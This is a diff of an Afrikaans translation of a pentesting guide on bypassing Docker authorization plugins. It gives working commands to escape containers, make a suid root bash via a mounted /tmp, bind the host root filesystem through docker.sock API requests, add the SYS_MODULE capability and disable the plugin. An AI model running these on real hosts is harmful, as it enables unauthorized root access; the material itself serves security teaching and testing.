@@ -1,26 +1,26 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Docker** se standaard **autorisatiemodel** is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisasie plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisasie plugin kan 'n Docker administrateur **fyn toegang** beleid konfigureer om toegang tot die Docker daemon te bestuur.
+**Docker** se out-of-the-box **autorisering** model is **alles of niks**. Enige gebruiker met toestemming om toegang tot die Docker daemon te verkry, kan **enige** Docker kliënt **opdrag** uitvoer. Dieselfde geld vir oproepers wat Docker se Engine API gebruik om die daemon te kontak. As jy **groter toegangbeheer** benodig, kan jy **autorisering plugins** skep en dit by jou Docker daemon konfigurasie voeg. Met 'n autorisering plugin kan 'n Docker administrateur **fyn toegang** beleid configureer om toegang tot die Docker daemon te bestuur.
 
 # Basiese argitektuur
 
-Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **aksies** wat aan die Docker Daemon **gevra** word, te **toelaat/ontken** **afhangende** van die **gebruiker** wat dit gevra het en die **aksie** **gevra**.
+Docker Auth plugins is **eksterne** **plugins** wat jy kan gebruik om **toestemming/ontkenning** van **aksies** wat aan die Docker Daemon **gevra** word, te **verleen** of te **weier** **afhangende** van die **gebruiker** wat dit gevra het en die **aksie** **gevra**.
 
-**[Die volgende inligting is uit die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
+**[Die volgende inligting is van die dokumentasie](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **gee** die **authentikasie** **substelsel** die versoek aan die geïnstalleerde **authentikasie** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegelaat** of **ontken** moet word.
+Wanneer 'n **HTTP** **versoek** aan die Docker **daemon** gemaak word deur die CLI of via die Engine API, **gee** die **authentisering** **substelsel** die versoek aan die geïnstalleerde **authentisering** **plugin**(s). Die versoek bevat die gebruiker (oproeper) en opdrag konteks. Die **plugin** is verantwoordelik om te besluit of die versoek **toegelaat** of **ontken** moet word.
 
-Die volgorde diagramme hieronder toon 'n toelaat en ontken autorisasie vloei:
+Die volgorde diagramme hieronder toon 'n toestaan en ontken autorisering vloei:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-Elke versoek wat aan die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentikasie metode** wat gebruik is, word aan die plugin deurgegee. Belangrik, **geen** gebruikers **akkrediteer** of tokens word deurgegee nie. Laastens, **nie alle versoek/antwoord liggame word** aan die autorisasie plugin gestuur nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.
+Elke versoek wat aan die plugin gestuur word, **sluit die geverifieerde gebruiker, die HTTP koptekste, en die versoek/antwoord liggaam** in. Slegs die **gebruikersnaam** en die **authentisering metode** wat gebruik is, word aan die plugin deurgegee. Belangrik, **geen** gebruikers **akkrediteer** of tokens word deurgegee nie. Laastens, **nie alle versoek/antwoord liggame word** aan die autorisering plugin gestuur nie. Slegs daardie versoek/antwoord liggame waar die `Content-Type` of `text/*` of `application/json` is, word gestuur.
 
-Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisasie plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisasie nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie aan die autorisasie plugins deurgegee nie. Vir opdragte wat gekapte HTTP antwoorde teruggee, soos `logs` en `events`, word slegs die HTTP versoek aan die autorisasie plugins gestuur.
+Vir opdragte wat moontlik die HTTP verbinding kan oorneem (`HTTP Upgrade`), soos `exec`, word die autorisering plugin slegs vir die aanvanklike HTTP versoeke aangeroep. Sodra die plugin die opdrag goedkeur, word autorisering nie op die res van die vloei toegepas nie. Spesifiek, die stroomdata word nie aan die autorisering plugins deurgegee nie. Vir opdragte wat chunked HTTP antwoord teruggee, soos `logs` en `events`, word slegs die HTTP versoek aan die autorisering plugins gestuur.
 
-Tydens versoek/antwoord verwerking, mag sommige autorisasie vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentikasie en sekuriteitsbeleide te konfigureer.
+Tydens versoek/antwoord verwerking, mag sommige autorisering vloei addisionele navrae aan die Docker daemon benodig. Om sulke vloei te voltooi, kan plugins die daemon API aanroep soos 'n gewone gebruiker. Om hierdie addisionele navrae moontlik te maak, moet die plugin die middele verskaf vir 'n administrateur om behoorlike authentisering en sekuriteitsbeleide te configureer.
 
 ## Verskeie Plugins
 
@@ -46,9 +46,9 @@ Lees die `README` en die `plugin.go` kode om te verstaan hoe dit werk.
 
 ## Enumereer toegang
 
-Die belangrikste dinge om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
+Die hoof dinge om te kontroleer is die **watter eindpunte toegelaat word** en **watter waardes van HostConfig toegelaat word**.
 
-Om hierdie enumerasie uit te voer, kan jy die **instrument** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
+Om hierdie enumerasie uit te voer, kan jy **die hulpmiddel** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**
 
 ## verbode `run --privileged`
 
@@ -56,7 +56,7 @@ Om hierdie enumerasie uit te voer, kan jy die **instrument** [**https://github.c
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### Om 'n houer te laat loop en dan 'n bevoorregte sessie te kry
+### Running a container and then getting a privileged session
 
 In hierdie geval het die stelselaanvoerder **gebruikers verbied om volumes te monteer en houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee:
 ```bash
@@ -76,11 +76,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Nou kan die gebruiker uit die houer ontsnap deur enige van die [**voorheen bespreekte tegnieke**](./#privileged-flag) en **privileges te verhoog** binne die gasheer.
+Nou kan die gebruiker uit die houer ontsnap deur enige van die [**voorheen bespreekte tegnieke**](#privileged-flag) en **privileges te verhoog** binne die gasheer.
 
 ## Monteer Skryfbare Gids
 
-In hierdie geval het die stelselaanvaarder **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
+In hierdie geval het die stelselaanvoerder **gebruikers verbied om houers met die `--privileged` vlag te laat loop** of enige ekstra vermoë aan die houer te gee, en hy het slegs toegelaat om die `/tmp` gids te monteer:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -90,15 +90,15 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 > [!NOTE]
-> Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare direkteure vind met: `find / -writable -type d 2>/dev/null`
+> Let daarop dat jy dalk nie die gids `/tmp` kan monteer nie, maar jy kan 'n **ander skryfbare gids** monteer. Jy kan skryfbare gidse vind met: `find / -writable -type d 2>/dev/null`
 >
-> **Let daarop dat nie al die direkteure in 'n linux masjien die suid bit sal ondersteun nie!** Om te kontroleer watter direkteure die suid bit ondersteun, voer `mount | grep -v "nosuid"` uit. Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.
+> **Let daarop dat nie al die gidse in 'n linux masjien die suid bit sal ondersteun nie!** Om te kontroleer watter gidse die suid bit ondersteun, hardloop `mount | grep -v "nosuid"` Byvoorbeeld, gewoonlik ondersteun `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` en `/var/lib/lxcfs` nie die suid bit nie.
 >
-> Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan **monteer**, jy dit as root vanuit die docker container kan verander om dit te **misbruik in die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig).
+> Let ook daarop dat as jy **`/etc`** of enige ander gids **wat konfigurasie lêers bevat**, kan monteer, jy dit as root vanuit die docker houer kan verander om dit te **misbruik op die gasheer** en voorregte te verhoog (miskien deur `/etc/shadow` te wysig)
 
 ## Ongekontroleerde API Eindpunt
 
-Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy dalk **sommige daarvan vergeet** wat 'n aanvaller kan toelaat om **voorregte te verhoog.**
+Die verantwoordelikheid van die sysadmin wat hierdie plugin konfigureer, sal wees om te beheer watter aksies en met watter voorregte elke gebruiker kan uitvoer. Daarom, as die admin 'n **swartlys** benadering met die eindpunte en die eienskappe neem, mag hy **sommige daarvan vergeet** wat 'n aanvaller kan toelaat om **voorregte te verhoog.**
 
 Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
@@ -106,8 +106,8 @@ Jy kan die docker API nagaan in [https://docs.docker.com/engine/api/v1.40/#](htt
 
 ### Bindings in root
 
-Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **'n paar belangrike parameters** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
-In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n container te skep en te laat loop wat die root (/) gids van die gasheer monteer:
+Dit is moontlik dat toe die sysadmin die docker vuurmuur gekonfigureer het, hy **'n belangrike parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Bindings**" **vergeet het**.\
+In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer te skep en te laat loop wat die root (/) gids van die gasheer monteer:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -118,17 +118,17 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 > [!WARNING]
-> Let op hoe ons in hierdie voorbeeld die **`Binds`** parameter as 'n wortelvlak sleutel in die JSON gebruik, maar in die API verskyn dit onder die sleutel **`HostConfig`**
+> Let op hoe ons in hierdie voorbeeld die **`Binds`** parameter as 'n wortelniveau sleutel in die JSON gebruik, maar in die API verskyn dit onder die sleutel **`HostConfig`**
 
 ### Binds in HostConfig
 
-Volg dieselfde instruksies as met **Binds in wortel** deur hierdie **aanvraag** aan die Docker API te doen:
+Volg dieselfde instruksies soos met **Binds in root** deur hierdie **aanvraag** aan die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
 ### Mounts in root
 
-Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** na die Docker API te doen:
+Volg dieselfde instruksies as met **Binds in root** deur hierdie **request** aan die Docker API te doen:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
@@ -138,9 +138,9 @@ Volg dieselfde instruksies as met **Binds in root** deur hierdie **versoek** aan
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Ongeëvalueerde JSON Attribuut
+## Onbeheerde JSON Kenmerk
 
-Dit is moontlik dat toe die stelselaanvoerder die docker-vuurmuur gekonfigureer het, hy **'n belangrike attribuut van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**" **vergeet het**. In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS_MODULE** vermoë te skep en te laat loop:
+Dit is moontlik dat toe die stelselaanvoerder die docker-vuurmuur gekonfigureer het, hy **vergeet het van 'n belangrike kenmerk van 'n parameter** van die [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) soos "**Capabilities**" binne "**HostConfig**". In die volgende voorbeeld is dit moontlik om hierdie miskonfigurasie te misbruik om 'n houer met die **SYS_MODULE** vermoë te skep en te laat loop:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -155,7 +155,7 @@ capsh --print
 
 ## Deaktiveer Plugin
 
-As die **sysadmin** **vergeet** het om die vermoë om die **plugin** te **deaktiveer**, kan jy hiervan voordeel trek om dit heeltemal te deaktiveer!
+As die **sysadmin** vergeet het om die vermoë om die **plugin** te **deaktiveer**, kan jy voordeel trek uit hierdie om dit heeltemal te deaktiveer!
 ```bash
 docker plugin list #Enumerate plugins
 
